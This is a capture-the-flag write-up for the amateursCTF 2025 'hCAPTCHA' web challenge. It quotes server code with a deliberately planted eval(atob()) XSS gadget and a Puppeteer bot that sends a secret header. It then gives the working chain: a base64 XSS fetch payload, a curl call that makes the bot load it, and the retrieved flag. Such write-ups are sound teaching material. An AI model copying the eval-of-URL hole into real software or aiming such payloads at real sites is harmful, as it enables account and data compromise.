# amateursCTF 2025 – hCAPTCHA Write‑up

## Challenge Overview

- URL: `https://web-hcaptcha-hjzpa3v8.amt.rs`
- Stack: Node.js (Express), Puppeteer (Chromium), hCaptcha.
- Goal: Make the application reveal the flag on `/`.

From `chall/index.mjs`:

```js
let show = false;
const secret = crypto.randomBytes(16).toString('hex');
const flag = process.env.FLAG || 'amateursCTF{t3st_f14g}';
```

The main page:

```js
app.get('/', (req, res) => {
  res.send(renderPage(`
    ...
    ${show ? `<div class="flag">Here is your flag: <code>${flag}</code></div>` : ''}

    <script>
      if (window.location.href.includes('xss')) {
        eval(atob(window.location.href.split('xss=')[1]));
      }
    </script>
  `));
});
```

- The flag is only rendered when `show === true`.
- There is an XSS gadget controlled by the `xss` query parameter, evaluated via `eval(atob(...))`.

## How `show` Becomes `true`

`show` is changed in `POST /`:

```js
app.post('/', (req, res) => {
    ...
    const hcaptchaResponse = req.body['h-captcha-response'];
    ...
    verifyCaptcha(hcaptchaResponse).then(data => {
        if (data.success) {
            if (req.headers['x-secret'] == secret) {
                show = true;
                res.send(renderMessage('Success', 'OMG U DID IT!'));
            } else {
                res.send(renderMessage('Verified', 'You are human! YYAYAYAYAYAY'));
            }
        } else {
            res.send(renderMessage('Error', 'I am not human!'));
        }
    })
});
```

To get the flag we need:

1. A **valid** hCaptcha token so that `data.success === true`.
2. The HTTP request must contain `X-secret: <secret>`, where `secret` is a random value only known to the server.

We can obtain a valid hCaptcha token legitimately by solving the widget in our browser, but we cannot guess `secret`. We instead abuse the bot.

## The Bot: `/share` + Puppeteer

`/share` is implemented as:

```js
app.post('/share', async (req, res) => {
    const { url } = req.body;
    ...
    const validUrl = new URL(url);
    if (validUrl.hostname !== '127.0.0.1') {
        res.send(renderMessage('Info', 'This request is useless!'));
    } else {
        puppeteer.launch({
            headless: true,
            executablePath: "/usr/bin/chromium",
            args: ["--no-sandbox", ...],
        }).then(async browser => {
            const page = await browser.newPage();
            await page.setExtraHTTPHeaders({
                'X-secret': secret
            });
            await page.goto(url);
            await new Promise(resolve => setTimeout(resolve, 5000));
            await browser.close();
        });
        res.send(renderMessage('OK', 'Sharing is caring!'));
    }
});
```

Important observations:

- `/share` will only accept URLs whose hostname is exactly `127.0.0.1`.
- For the Puppeteer page, it sets an extra header on **every request**: `X-secret: secret`.
- Puppeteer then visits our chosen `url` on localhost.

Combining this with the XSS gadget on `/`, we can:

1. Make the bot open `http://127.0.0.1:4071/?xss=...`.
2. Have that page execute arbitrary JS (via `eval(atob(xss))`).
3. From that JS, send a `POST /` with our hCaptcha token.
4. That request will automatically include `X-secret: secret` because it originates from the Puppeteer page.

If the token is valid, `show` becomes `true` and the flag will be rendered for **everyone** visiting `/`.

## Getting a Valid hCaptcha Token

The verifier service (`verifier/index.mjs`) forwards tokens to `https://hcaptcha.com/siteverify`:

```js
const HCAPTCHA_SECRET = process.env.HCAPTCHA_SECRET;
...
const resp = await fetch('https://hcaptcha.com/siteverify', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: `secret=${encodeURIComponent(HCAPTCHA_SECRET)}&response=${encodeURIComponent(token)}`
});
```

We do not need to know `HCAPTCHA_SECRET`. The front-end embeds a real hCaptcha widget:

```html
<h-captcha id="signupCaptcha"
  site-key="7e1e8cb8-bb22-4570-b1b0-46c6b02ce51a"
  size="normal"
  tabindex="0"></h-captcha>
```

So the plan is:

1. Open `https://web-hcaptcha-hjzpa3v8.amt.rs/` in a browser.
2. Solve the hCaptcha puzzle until a green checkmark appears.
3. **Do not** click the `Submit` button.
4. Open DevTools → Console and run:
   ```js
   hcaptcha.getResponse()
   ```
   or, if that is empty:
   ```js
   hcaptcha.getResponse('signupCaptcha')
   ```
5. Copy the returned token (a long string starting with `P1_...`).

This token is valid for the backend’s call to `siteverify`, so using it in `h-captcha-response` will make `data.success === true`.

## Second Stage: Using the Bot to Set `show = true`

Now that we have a valid token, we want **the bot** (with the `X-secret` header) to send:

```http
POST / HTTP/1.1
Host: web-hcaptcha-...
Content-Type: application/x-www-form-urlencoded
X-secret: <secret>   // added by Puppeteer

h-captcha-response=<your_token_here>
```

To do that, we craft a JavaScript payload and feed it to the XSS parameter so that when the bot visits the page, it executes our code.

Example JS (adapted to our real token):

```js
(async () => {
  const token = 'P1_...';  // token from hcaptcha.getResponse()
  await fetch('/', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'h-captcha-response=' + encodeURIComponent(token)
  });
})();
```

Then we base64-encode this snippet to get `PAYLOAD_B64`, and construct a URL for the bot:

- `http://127.0.0.1:4071/?xss=PAYLOAD_B64`

We make the server’s bot open this URL by calling `/share`:

```bash
curl -k -s \
  -X POST 'https://web-hcaptcha-hjzpa3v8.amt.rs/share' \
  -H 'Content-Type: application/json' \
  -d '{
    "url": "http://127.0.0.1:4071/?xss=PAYLOAD_B64"
  }'
```

The server responds with an `OK / Sharing is caring!` message, indicating that Puppeteer was launched and visited our URL.

Inside the container:

1. Puppeteer opens `http://127.0.0.1:4071/?xss=PAYLOAD_B64` with `X-secret: secret` attached via `setExtraHTTPHeaders`.
2. The page script runs:
   ```js
   if (window.location.href.includes('xss')) {
     eval(atob(window.location.href.split('xss=')[1]));
   }
   ```
   which executes our payload.
3. Our payload runs `fetch('/', ...)` with the solved hCaptcha token.
4. That request includes `X-secret: secret` (set on the Puppeteer page), so the `POST /` handler sees:
   - `data.success === true`, and
   - `req.headers['x-secret'] == secret`.
5. The handler does `show = true`.

Once `show` is set to `true`, it stays true for the process lifetime, so any future GET `/` will include the flag.

## Final Step: Retrieve the Flag

Now we just visit `/` normally (from curl or a browser).

Example with curl:

```bash
curl -k -s 'https://web-hcaptcha-hjzpa3v8.amt.rs/' | grep -i 'Here is your flag'
```

Output (simplified):

```html
<div class="flag">Here is your flag: <code>amateursCTF{W_C4PTCH4_B3h4v13r}</code></div>
```

So the final flag is:

```text
amateursCTF{W_C4PTCH4_B3h4v13r}
```

## Vulnerability Summary

- **Core bug:** A server-side flag gate depends on both a third-party captcha and a secret header. But that secret header is later attached to a headless browser (Puppeteer) that we can partially control.
- **Primitive 1 – Bot with secret header:** `/share` lets us choose a URL on `127.0.0.1` that a Puppeteer instance (with `X-secret: secret`) will visit.
- **Primitive 2 – XSS on `/`:** `?xss=<base64(JavaScript)>` is evaluated with `eval(atob(...))`.
- **Combination:** By pointing `/share` at `/` with `xss` set to a script that posts our **legit hCaptcha token**, we cause the bot to trigger the success path and set `show = true`.
- After that, the flag is visible on the public `/` page.

This is a classic “captcha + internal bot + XSS” chaining challenge:
- Get a valid captcha token yourself,
- Use XSS to script the bot,
- Let the bot (with its secret header) unlock the flag for you.

